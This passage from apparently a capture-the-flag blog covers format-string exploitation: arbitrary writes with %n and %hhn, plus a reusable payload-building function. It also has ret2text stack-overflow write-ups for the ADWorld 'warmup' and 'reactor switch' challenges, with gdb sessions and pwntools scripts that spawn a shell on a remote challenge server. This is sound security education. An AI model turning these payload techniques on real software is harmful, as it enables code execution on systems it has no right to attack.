`efgh` </span></span><br><span class="line">gef➤  x/x 0xffffd3c0</span><br><span class="line">0xffffd3c0:     0x72657771      <span class="comment"># `qwer`</span></span><br><span class="line">gef➤  x/x 0xffffd3c4</span><br><span class="line">0xffffd3c4:     0x66647361      <span class="comment"># `asdf`</span></span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure>
<p>The <code>aa%order</code> occupies 6th parameter (item), the <code>$n[padding]</code> should form 7th parameter so that leave <code>[addr]</code> to be 8th parameter too.<br>Therefore <code>order</code> is <code>8</code> and <code>[padding]</code> should be 2 chars.<br><img src="/imghost/fsvi/a.png" alt="variable a addr"><br>As <code>a</code> is a global variable in <code>.data</code> section, and we use <code>-no-pie</code> to make base address static, so its address <code>0x00004024</code> is changeless. So final exploit should be: <code>aa%8$nxx</code> plus <code>0x00004024</code>. Still need <code>pwntools</code>:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./overwrite&#x27;</span>)</span><br><span class="line">a_addr = <span class="number">0x0804C024</span></span><br><span class="line">payload = <span class="string">&#x27;aa%8$nxx&#x27;</span> + p32(a_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>Finally reach the <code>Path 2</code>.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python path2.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./overwrite&#x27;</span>: pid 411</span><br><span class="line">[*] Process <span class="string">&#x27;./overwrite&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 411)</span><br><span class="line">0xffea723c</span><br><span class="line">input:</span><br><span class="line">aaaa$----------------</span><br><span class="line">Path 2</span><br><span class="line"></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<p>The last challenge is <code>Path 3</code> with a huge number to meet. If we also use padding, pretty much padding it is an unlikely successful exploit.<br>Here introduces <code>hh</code> and <code>h</code>, so what is the point of the h and hh modifiers for printf format specifiers?</p>
<p><code>h</code>:    it stands for a half.</p>
<ul>
<li>Speciﬁes that a following d, i, o, u, x, or X conversion speciﬁer applies to a short int or unsigned short int argument (the argument will have been promoted according to the integer promotions, but its value shall be converted to short int or unsigned short int before printing); or that a following n conversion speciﬁer applies to a pointer to a short int argument.</li>
</ul>
<p><code>hh</code>:   it stands for, as a historical guess, for half of a half.</p>
<ul>
<li>Change <code>short</code> in <code>h</code> explanation to <code>char</code>.</li>
</ul>
<p>After combining with <code>%n</code>, use <code>%hhn</code> to output a char size (1 bytes), use <code>%hn</code> to output a short size (2 bytes). <code>Path 3</code> needs <code>b</code> to be <code>0xdeadbeef</code>, so we can fill the bytes one by one to form a coherent <code>0xdeadbeef</code>.<br><img src="/imghost/fsvi/a.png" alt="variable a addr"><br>First get <code>b</code> address: <code>0x0804C028</code>. Then we cover memory as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address     hex      decimal</span><br><span class="line">0x0804C028  \xef     # 239</span><br><span class="line">0x0804C029  \xbe     # 190</span><br><span class="line">0x0804C02a  \xad     # 173</span><br><span class="line">0x0804C02b  \xde     # 222</span><br></pre></td></tr></table></figure>
<p>we still remember that the <code>order</code> is <code>6</code>. Build the payload now:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># since \xad &lt; \xbe &lt; \xde &lt; \xef</span></span><br><span class="line"><span class="comment"># so overwrite order is unique, from smaller to the larger</span></span><br><span class="line">p32(<span class="number">0x0804C02a</span>)+p32(<span class="number">0x0804C029</span>)+p32(<span class="number">0x0804C02b</span>)+p32(<span class="number">0x0804C028</span>)+<span class="string">&#x27;%157c&#x27;</span>+<span class="string">&#x27;%6$hhn&#x27;</span>+<span class="string">&#x27;%17c&#x27;</span>+<span class="string">&#x27;%7$hhn&#x27;</span>+<span class="string">&#x27;%32c&#x27;</span>+<span class="string">&#x27;%8$hhn&#x27;</span>+<span class="string">&#x27;%17c&#x27;</span>+<span class="string">&#x27;%9$hhn&#x27;</span></span><br></pre></td></tr></table></figure>
<p>This is my solution, while I find another clever choice, which gives a method for all this kind of problems (similar to <code>fmtstr_payload</code> in <code>pwntools</code>): </p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span>(<span class="params">prev, word, index</span>):</span></span><br><span class="line">    <span class="keyword">if</span> prev &lt; word:</span><br><span class="line">        result = word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> prev == word:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="number">256</span> + word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    fmtstr += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(index) + <span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_str</span>(<span class="params">offset, size, addr, target</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">4</span>:</span><br><span class="line">            payload += p32(addr + i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(addr + i)</span><br><span class="line">    prev = <span class="built_in">len</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i*<span class="number">8</span>) &amp; <span class="number">0xff</span>, offset + i)</span><br><span class="line">        prev = (target&gt;&gt; i*<span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload = fmt_str(<span class="number">6</span>,<span class="number">4</span>,<span class="number">0x0804C028</span>,<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="comment"># `6` represents `order`</span></span><br><span class="line"><span class="comment"># `4` represents `32-bit`</span></span><br><span class="line"><span class="comment"># `0x0804C028` indicates start address</span></span><br><span class="line"><span class="comment"># `0xdeadbeef` indicates what to write</span></span><br></pre></td></tr></table></figure>
<p>Here comes the script to reach <code>Path 3</code>:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">...</span><br><span class="line">sh = process(<span class="string">&#x27;./overwrite&#x27;</span>)</span><br><span class="line">payload = fmt_str(<span class="number">6</span>,<span class="number">4</span>,<span class="number">0x0804C028</span>,<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">payload = p32(<span class="number">0x0804C02a</span>)+p32(<span class="number">0x0804C029</span>)+p32(<span class="number">0x0804C02b</span>)+p32(<span class="number">0x0804C028</span>)+<span class="string">&#x27;%157c&#x27;</span>+<span class="string">&#x27;%6$hhn&#x27;</span>+<span class="string">&#x27;%17c&#x27;</span>+<span class="string">&#x27;%7$hhn&#x27;</span>+<span class="string">&#x27;%32c&#x27;</span>+<span class="string">&#x27;%8$hhn&#x27;</span>+<span class="string">&#x27;%17c&#x27;</span>+<span class="string">&#x27;%9$hhn&#x27;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>And the result:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python path3.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./overwrite&#x27;</span>: pid 1327</span><br><span class="line">[*] Process <span class="string">&#x27;./overwrite&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 1327)</span><br><span class="line">0xff92fc2c</span><br><span class="line">input:</span><br><span class="line">*)+(                                                                                                                                                                            @                               \x99                \x00---------------</span><br><span class="line">Path 3</span><br><span class="line"></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux</tag>
        <tag>format-string</tag>
      </tags>
  </entry>
  <entry>
    <title>ADWorld PWN Challenge Area Write-ups (ret2text)</title>
    <url>/2020/07/29/2020-07-29-ADWorld-PWN-Challenge-Area-Write-ups-ret2text/</url>
    <content><![CDATA[<p>There are some easy <code>ret2text</code> challenges in challenge area.</p>
<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>Attachment: <a href="/filehost/apcaw/warmup">warmup</a><br>Description: None</p>
<p>Dont know what is this for, as it’s  fairly easy.</p>
<h3 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file warmup</span><br><span class="line">warmup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=7b7d75c51503566eb1203781298d9f0355a66bd3, stripped</span><br><span class="line">$ checksec warmup</span><br><span class="line">[*] &#x27;/mnt/c/Users/David/Desktop/warmup&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<p>Pseudocode:<br><code>main</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+40h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;-Warm Up-\n&quot;</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;WOW:&quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">&quot;%p\n&quot;</span>, sub_40060D);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, &amp;s, <span class="number">9uLL</span>);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">gets</span>(&amp;v5, <span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_40060D</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_40060D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>The target is returning to <code>sub_40060D()</code>, here introduce a method using <code>cyclic</code> (installed along with <code>pwntools</code>).<br>First create a 200-byte-length string:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br></pre></td></tr></table></figure>
<p>Then input it in <code>gdb</code> and debug:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ gdb ./warmup -q</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> `gef` to start, `gef config` to configure</span><br><span class="line">88 commands loaded <span class="keyword">for</span> GDB 9.2 using Python engine 3.8</span><br><span class="line">Reading symbols from ./warmup...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> ./warmup)</span><br><span class="line">gef➤  b gets</span><br><span class="line">Breakpoint 1 at 0x400500</span><br><span class="line">...</span><br><span class="line">gef➤                         <span class="comment"># input</span></span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">...</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x00000000004006a4 <span class="keyword">in</span> ?? ()</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">────────────────────────── registers ────</span><br><span class="line"><span class="variable">$rax</span>   : 0x00007fffffffe1e0  →  <span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]&quot;</span></span><br><span class="line"><span class="variable">$rbx</span>   : 0x0</span><br><span class="line"><span class="variable">$rcx</span>   : 0x00007ffff7fbc980  →  0x00000000fbad2288</span><br><span class="line"><span class="variable">$rdx</span>   : 0x0</span><br><span class="line"><span class="variable">$rsp</span>   : 0x00007fffffffe228  →  <span class="string">&quot;saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfa[...]&quot;</span></span><br><span class="line"><span class="variable">$rbp</span>   : 0x6161617261616171 (<span class="string">&quot;qaaaraaa&quot;</span>?)</span><br><span class="line"><span class="variable">$rsi</span>   : 0x00000000006022a1  →  <span class="string">&quot;aaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaa[...]&quot;</span></span><br><span class="line"><span class="variable">$rdi</span>   : 0x00007ffff7fbf4d0  →  0x0000000000000000</span><br><span class="line"><span class="variable">$rip</span>   : 0x00000000004006a4  →   ret</span><br><span class="line"><span class="variable">$r8</span>    : 0x00007fffffffe1e0  →  <span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]&quot;</span></span><br><span class="line"><span class="variable">$r9</span>    : 0x0</span><br><span class="line"><span class="variable">$r10</span>   : 0x410</span><br><span class="line"><span class="variable">$r11</span>   : 0x246</span><br><span class="line"><span class="variable">$r12</span>   : 0x0000000000400520  →   xor ebp, ebp</span><br><span class="line"><span class="variable">$r13</span>   : 0x00007fffffffe300  →  0x0000000000000001</span><br><span class="line"><span class="variable">$r14</span>   : 0x0</span><br><span class="line"><span class="variable">$r15</span>   : 0x0</span><br><span class="line"><span class="variable">$eflags</span>: [zero carry PARITY adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow RESUME virtualx86 identification]</span><br><span class="line"><span class="variable">$cs</span>: 0x0033 <span class="variable">$ss</span>: 0x002b <span class="variable">$ds</span>: 0x0000 <span class="variable">$es</span>: 0x0000 <span class="variable">$fs</span>: 0x0000 <span class="variable">$gs</span>: 0x0000</span><br><span class="line">────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffe228│+0x0000: <span class="string">&quot;saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfa[...]&quot;</span>    ← <span class="variable">$rsp</span></span><br><span class="line">0x00007fffffffe230│+0x0008: <span class="string">&quot;uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabha[...]&quot;</span></span><br><span class="line">0x00007fffffffe238│+0x0010: <span class="string">&quot;waaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabja[...]&quot;</span></span><br><span class="line">0x00007fffffffe240│+0x0018: <span class="string">&quot;yaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaabla[...]&quot;</span></span><br><span class="line">0x00007fffffffe248│+0x0020: <span class="string">&quot;baabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabna[...]&quot;</span></span><br><span class="line">0x00007fffffffe250│+0x0028: <span class="string">&quot;daabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpa[...]&quot;</span></span><br><span class="line">0x00007fffffffe258│+0x0030: <span class="string">&quot;faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]&quot;</span></span><br><span class="line">0x00007fffffffe260│+0x0038: <span class="string">&quot;haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]&quot;</span></span><br><span class="line">──────────────────────── code:x86:64 ────</span><br><span class="line">     0x400699                  mov    eax, 0x0</span><br><span class="line">     0x40069e                  call   0x400500 &lt;gets@plt&gt;</span><br><span class="line">     0x4006a3                  leave</span><br><span class="line"> →   0x4006a4                  ret</span><br><span class="line">[!] Cannot disassemble from <span class="variable">$PC</span></span><br><span class="line">──────────────────────────── threads ────</span><br><span class="line">[<span class="comment">#0] Id 1, Name: &quot;warmup&quot;, stopped 0x4006a4 in ?? (), reason: SIGSEGV</span></span><br><span class="line">────────────────────────────── trace ────</span><br><span class="line">[<span class="comment">#0] 0x4006a4 → ret</span></span><br><span class="line">─────────────────────────────────────────</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure>
<p>Remember to break at the last <code>ret</code> (belongs to <code>main()</code>), so the <code>rsp</code> now stores the future <code>rip</code>. <code>rsp</code> starts with <code>saaa</code>, then use <code>cyclic</code> to calculate the offset (<code>rbp</code> that starts with <code>qaaa</code> can also be used, but remember to add 8 bytes):</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ cyclic -l saaa  <span class="comment"># rsp</span></span><br><span class="line">72</span><br><span class="line">$ cyclic -l qaaa  <span class="comment"># rbp</span></span><br><span class="line">64</span><br></pre></td></tr></table></figure>
<p>So the offset should be <code>64 + 8 = 72</code>.</p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;warmup&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">57407</span>)</span><br><span class="line">shell_addr = <span class="number">0x40060d</span></span><br><span class="line"><span class="built_in">print</span> sh.recv() </span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">72</span> + p64(shell_addr) </span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">64</span> + p64(<span class="number">0</span>) + p64(shell_addr)</span><br><span class="line"><span class="comment">#payload = xxxxx + ebp + retaddr</span></span><br><span class="line">sh.sendline(payload) </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="reactor-switch"><a href="#reactor-switch" class="headerlink" title="reactor switch"></a>reactor switch</h2><p>Attachment: <a href="/filehost/apcaw/reactor_switch">reactor_switch</a><br>Description: Lil M discovered the interface of a nitrification reactor in a TNT production line in a private mine. She suspects that this factory might be engaged in the production of underground munitions, so Lil M intends to interfere with the operation of this TNT production line by closing the reactor, but the reactor has multiple gates, so she has to find a way to help her close all the gates.</p>
<h3 id="Information-1"><a href="#Information-1" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ file reactor_switch</span><br><span class="line">reactor_switch: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=6145840505e7d75d0020a02b556136ce4c936ed9, not stripped</span><br><span class="line">$ checksec reactor_switch</span><br><span class="line">[*] <span class="string">&#x27;/root/reactor_switch&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>Pseudocode:<br><code>main</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-240h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+40h] [rbp-200h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;Please closing the reaction kettle\n&quot;</span>, <span class="number">0x23</span>uLL);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;The switch is:&quot;</span>, <span class="number">0xE</span>uLL);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">&quot;%p\n&quot;</span>, easy);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, &amp;s, <span class="number">9uLL</span>);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">2uLL</span>);</span><br><span class="line">  <span class="built_in">gets</span>(&amp;v5, <span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>easy</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">easy</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-1C0h]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+40h] [rbp-180h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;You have closed the first switch\n&quot;</span>, <span class="number">0x21</span>uLL);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;Please closing the second reaction kettle\n&quot;</span>, <span class="number">0x2A</span>uLL);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;The switch is:&quot;</span>, <span class="number">0xE</span>uLL);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">&quot;%p\n&quot;</span>, normal);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, &amp;s, <span class="number">9uLL</span>);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">2uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">gets</span>(&amp;v2, <span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>normal</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">normal</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-140h]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+40h] [rbp-100h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;You have closed the first switch\n&quot;</span>, <span class="number">0x22</span>uLL);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;Please closing the third reaction kettle\n&quot;</span>, <span class="number">0x2A</span>uLL);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;The switch is:&quot;</span>, <span class="number">0xE</span>uLL);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">&quot;%p\n&quot;</span>, shell);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, &amp;s, <span class="number">9uLL</span>);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">2uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">gets</span>(&amp;v2, <span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>shell</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Addresses:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">easy	00000000004006B0	</span><br><span class="line">main	0000000000400759	</span><br><span class="line">normal	0000000000400607	</span><br><span class="line">shell	00000000004005F6	</span><br></pre></td></tr></table></figure>
<h3 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h3><p>Well, according to the description, I thought it would be a series of tasks. As for the codes, It seems to let us overflow 3 times to get shell.<br>For one thing, the program wasn’t written carefully since it always prints <code>You have closed the first switch</code> in <code>main()</code>, <code>easy()</code> and <code>normal()</code> (should be 1st, 2nd and 3rd, right?); for another thing, as we just want to get shell, we can overflow just once (unexpect solution: overflow to return to <code>shell()</code>).</p>
<p>Offsets for three functions: <code>0x200</code> for <code>main()</code>; <code>0x180</code> for <code>easy()</code>; <code>0x100</code> for <code>normal()</code>.</p>
<h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><p>From <code>main()</code> return to <code>easy()</code> to <code>normal()</code> to <code>shell()</code>:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./reactor_switch&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">42608</span>)</span><br><span class="line"></span><br><span class="line">main_offset = <span class="number">0x200</span></span><br><span class="line">easy_offset = <span class="number">0x180</span></span><br><span class="line">normal_offset = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">easy_func_addr = <span class="number">0x04006b0</span></span><br><span class="line">normal_func_addr = <span class="number">0x0400607</span></span><br><span class="line">shell_func_addr = <span class="number">0x04005F6</span></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span> * main_offset + p64(<span class="number">0</span>) + p64(easy_func_addr)</span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span> * easy_offset + p64(<span class="number">0</span>) + p64(normal_func_addr)</span><br><span class="line">payload3 = <span class="string">&#x27;a&#x27;</span> * normal_offset + p64(<span class="number">0</span>) + p64(shell_func_addr)</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># ...&gt;</span></span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># ...&gt;</span></span><br><span class="line">sh.sendline(payload2)</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># ...&gt;</span></span><br><span class="line">sh.sendline(payload3)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>Unexpect solution: From <code>main()</code> return to <code>shell()</code>:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./reactor_switch&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">42608</span>)</span><br><span class="line"></span><br><span class="line">shell_func_addr = <span class="number">0x04005F6</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">512</span> + p64(<span class="number">0</span>) + p64(shell_func_addr)</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># ...&gt;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

